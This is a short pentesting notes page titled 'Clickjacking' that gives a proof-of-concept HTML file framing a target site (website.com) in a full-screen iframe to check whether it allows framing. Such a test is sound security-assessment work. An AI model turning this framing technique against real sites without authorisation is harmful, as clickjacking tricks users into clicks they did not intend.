---
title: "Clickjacking"
draft: false
images: []
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---

### POC

```
<html>
<head><title>POC</title></head>
<body style="background-color:black">
<br />
<center><h3 style="color:white">ClickJacking</h3></center>
<center><iframe src="https://website.com" style="width:90%;height:90%"></iframe></center>
</body>
</html>
```